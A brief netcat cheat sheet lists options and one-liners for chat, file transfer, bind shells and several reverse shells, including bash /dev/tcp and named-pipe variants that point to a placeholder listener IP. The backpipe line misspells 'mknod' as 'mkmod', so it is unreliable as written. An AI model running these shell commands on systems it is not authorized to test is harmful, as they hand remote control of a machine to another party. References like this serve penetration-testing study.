# Netcat Cheat Sheet
Quick reference for Netcat commands.

- `nc [options] [TargetIPaddr] [port(s)]`

## Command options

- `-l` : listen mode (server)
- `-p <port>` : specify local port
- `-u` : use UDP instead of TCP
- `-e <program>` : execute a program after connection
- `-n` : no DNS resolution
- `-z` : scan only
- `-v` : verbose
- `-vv` : very verbose
- `-w <seconds>` : timeout for connects and final net reads
- `-r` : randomize ports in scan
  
## Basic commands
- `Chat Interface`:
  - `Listener: nc -lvp [port]`
  - `Client: nc [Listenser_IP] [port]`
  
- `File Transfer`:
  - `Listener: nc -v -w 30 -l -p [port] < [file]`
  - `Client: nc -v -w 5 [Listener_IP] [port] > [file]`

- `Reverse Shell`:
  - `Listener: nc -lvp [port]`
  - `Client: nc [Listener_IP] [port] -e cmd.exe` 
  
- `Bind Shell`:
  - `Listener: nc -lvp [port] -e cmd.exe`
  - `Client: nc [Listener_IP] [port]`
  
## Advance commands
- `Reverse Shell using TCP socket`:
  - `Listener: nc -lvp [port]`
  - `Client: /bin/bash -i > /dev/tcp/[Listener_IP]/[port] 0<&1 2>&1`

- `Reverse Shell using backpipes`:
  - `Listener: nc -lvp [port]`
  - `Client: mkmod backpipe p; nc [Listener_IP] [port] 0<backpipe | /bin/bash 1>backpipe`
  
    

